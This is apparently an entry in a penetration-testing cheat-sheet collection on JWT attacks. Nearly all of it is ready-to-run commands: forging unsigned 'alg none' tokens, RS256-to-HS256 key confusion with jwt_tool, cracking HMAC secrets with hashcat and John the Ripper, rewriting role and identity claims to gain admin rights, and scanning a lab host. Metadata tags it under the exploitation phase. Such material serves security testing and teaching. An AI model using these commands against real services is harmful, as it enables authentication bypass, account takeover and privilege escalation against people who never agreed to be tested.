---
description: |
  JWT (JSON Web Token) attacks — exploit weak signing algorithms, brute-force secrets, and manipulate claims to bypass authentication and escalate privileges.
command: |
  # Decode JWT — inspect header and payload
  # Decode JWT parts (header.payload.signature)
  echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic2VjX3VzZXIiLCJyb2xlIjoidXNlciJ9.signature' | cut -d'.' -f1 | base64 -d
  echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic2VjX3VzZXIiLCJyb2xlIjoidXNlciJ9.signature' | cut -d'.' -f2 | base64 -d

  # Or use jwt.io to decode and inspect visually

  # None algorithm attack — bypass signature verification
  # Change header alg to "none" and remove signature
  # Original header: {"alg":"HS256","typ":"JWT"}
  # Tampered header: {"alg":"none","typ":"JWT"}

  # Base64 encode new header and payload, set empty signature
  echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
  echo -n '{"user":"sec_user","role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

  # Final token: header.payload.  (empty signature, keep trailing dot)

  # Key confusion attack — RS256 to HS256
  # If server uses RS256 (asymmetric), change alg to HS256 (symmetric)
  # Sign the token using the server's PUBLIC key as the HMAC secret
  # Server may verify HMAC signature using its public key

  # jwt_tool key confusion attack
  python3 jwt_tool.py TOKEN -X k -pk public_key.pem

  # Brute-force JWT secret
  # Hashcat — crack JWT HMAC secret
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

  # John the Ripper
  john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

  # jwt_tool — dictionary attack
  python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

  # Modify claims — escalate privileges
  # Change role from user to admin
  {"user":"sec_user","role":"user"} → {"user":"sec_user","role":"admin"}

  # Change user identity
  {"user":"sec_user","id":1} → {"user":"admin","id":0}

  # If secret is known, resign the modified token
  python3 jwt_tool.py TOKEN -T -S hs256 -p "secret"

  # Expired token reuse
  # Some servers don't validate the "exp" claim
  # Replay expired tokens to test if time-based validation is enforced
  # Modify exp claim to a future timestamp
  python3 jwt_tool.py TOKEN -T -S hs256 -p "secret"
  # Change "exp" to a future unix timestamp

  # jwt_tool — comprehensive JWT testing
  # Tamper and resign with known secret
  python3 jwt_tool.py TOKEN -T -S hs256 -p "secret"

  # Test all known vulnerabilities automatically
  python3 jwt_tool.py TOKEN -M at

  # Inject custom claims
  python3 jwt_tool.py TOKEN -I -pc role -pv admin -S hs256 -p "secret"

  # Scan for common misconfigurations
  python3 jwt_tool.py -t http://10.10.10.27/api/protected -rh "Authorization: Bearer TOKEN" -M pb
items:
  - No_Creds
  - Credentials
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - JWT_Attack
references:
  - https://jwt.io/
  - https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
  - https://github.com/ticarpi/jwt_tool
---
